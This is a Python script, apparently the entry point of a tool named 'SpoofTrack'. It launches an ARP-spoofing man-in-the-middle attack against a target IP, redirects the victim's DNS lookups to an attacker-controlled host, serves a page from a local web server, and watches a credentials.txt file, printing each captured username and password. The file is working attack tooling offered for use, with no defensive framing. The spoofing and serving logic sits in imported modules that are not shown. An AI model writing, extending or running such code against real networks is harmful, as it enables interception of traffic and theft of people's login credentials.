#!/usr/bin/env python3

import arp_spoofer
import dns_spoofer

import argparse
import threading
import signal
import os
import time

from termcolor import colored
from server import Server

# Controlled quite
def def_handler(sig, frame):
    print(colored("\n[!] Quitting the program...\n", "red"))
    arp_spoofer.revert_spoof()
    stop_event.set()
    os._exit(1)

signal.signal(signal.SIGINT, def_handler) # CTRL + C

# Menu arguments
def get_arguments():
    argparser = argparse.ArgumentParser(description="ARP Spoofer - MITM")
    argparser.add_argument("-t", "--taret", dest="target", required=True, help="Target IP. (Ex: 192.168.1.2") # target argument
    argparser.add_argument("-r", "--router", dest="router", required=True, help="Gateway IP of router. (Ex: 192.168.1.1)") # router ip argument
    argparser.add_argument("-m", "--mac", dest="mac_address", required=True, help="Your current mac addreess. (Ex: aa:bb:cc:44:55:66)") # mac_address argument
    argparser.add_argument("-i", "--interface", dest="interface", required=True, help="Network Interface Name. (Ex: wlan0)") # interface argument
    argparser.add_argument("-ip", "--ip-host", dest="ip_host", required=True, help="IP to redirect DNS Resolution. (Ex: 192.168.100.15)") # interface argument

    args = argparser.parse_args() # get arguments

    return args.target, args.interface, args.router, args.mac_address, args.ip_host # return each argument

def run_threads():
    count = 0
    for thread in threads:
        thread.start()
        count += 1
        if count != 3:
            time.sleep(1)
            print(colored(f"\n---------------------------------------------------------\n", "blue"))

def define_thread(args, function):
    thread1 = threading.Thread(target=function, args=args)

    threads.append(thread1)

def verify_root():
    # Verify root privilege
    if os.getuid() != 0:
        print(colored("\n[!] Root privileges required.\n", "yellow"))
        os._exit(1)

def server(ip):
    server = Server()
    print(colored(f"[+] Server initialized: http://{ip}:80", "green"))
    server.start_server(ip)

def verify_file(path):
    while True:
        if os.path.exists(path):
            with open(path, 'r') as f:
                content = f.read()

                content = content.split('\n')
                if len(content) == 3:
                    print(colored(f"\n[+] Credentials:\n", "yellow"))
                    print(colored(f"\tUsername: {content[0]}\n", "green"))
                    print(colored(f"\tPassword: {content[1]}\n", "green"))
                    def_handler('', '')


        time.sleep(2)


def print_banner():
    print(colored("""
█▀ █▀█ █▀█ █▀█ █▀▀ ▀█▀ █▀█ ▄▀█ █▀▀ █▄▀
▄█ █▀▀ █▄█ █▄█ █▀░ ░█░ █▀▄ █▀█ █▄▄ █░█\n""", 'white'))

    print(colored("""ᴍᴀᴅᴇ ʙʏ sᴀᴍᴍʏ-ᴜʟғʜ ᴀɴᴅ JᴇsᴜsWᴏʀ\n""", 'yellow'))

def main():
    print_banner()
    verify_root()

    global threads, stop_event

    stop_event = threading.Event()
    threads = []
    target, interface, router, mac_address, ip_server = get_arguments()

    isValid = arp_spoofer.verify(target, interface, router, mac_address) # Verify format arguments
    define_thread(args=(target, interface, router, mac_address, stop_event, isValid), function=arp_spoofer.main)
    define_thread(args=(ip_server,), function=server)
    define_thread(args=(ip_server,), function=dns_spoofer.main)
    define_thread(args=('credentials.txt',), function=verify_file)
    
    run_threads()

if __name__ == "__main__":
    main()
